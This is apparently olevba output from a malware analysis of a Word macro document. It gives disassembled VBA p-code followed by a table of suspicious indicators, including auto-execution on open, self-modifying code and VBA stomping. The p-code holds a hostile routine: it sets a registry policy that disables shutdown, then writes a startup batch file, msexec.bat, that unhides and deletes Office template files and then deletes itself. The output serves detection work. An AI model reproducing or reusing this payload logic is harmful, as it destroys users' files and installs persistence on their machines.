' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #66:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0007 "NoClose"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #67:
' 	EndSelect 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	ExitSub 
' Line #70:
' 	Label Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7 
' Line #71:
' 	Ld NormalTemplate 
' 	St Fm8 
' Line #72:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msexec.bat"
' 	St Ku0Yj6 
' Line #73:
' 	LitStr 0x000D "attrib -h -r "
' 	St Kr4Tl5Yk8Fe9 
' Line #74:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St Lh7Tu1Ki7Qc1 
' Line #75:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 
' Line #76:
' 	LitStr 0x0004 "del "
' 	St Wv2Ln0Ai5Uz9Nv1Bd8 
' Line #77:
' 	Ld Ku0Yj6 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld vbCr 
' 	Ld vbLf 
' 	Add 
' 	LitStr 0x0009 "@echo off"
' 	Add 
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Kr4Tl5Yk8Fe9 
' 	Ld Lh7Tu1Ki7Qc1 
' 	Add 
' 	Ld Fm8 
' 	Add 
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Kr4Tl5Yk8Fe9 
' 	Ld Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 
' 	Add 
' 	Ld Fm8 
' 	Add 
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Wv2Ln0Ai5Uz9Nv1Bd8 
' 	Ld Lh7Tu1Ki7Qc1 
' 	Add 
' 	Ld Fm8 
' 	Add 
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Wv2Ln0Ai5Uz9Nv1Bd8 
' 	Ld Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 
' 	Add 
' 	Ld Fm8 
' 	Add 
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Wv2Ln0Ai5Uz9Nv1Bd8 
' 	Ld Ku0Yj6 
' 	Add 
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #86:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msexec.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

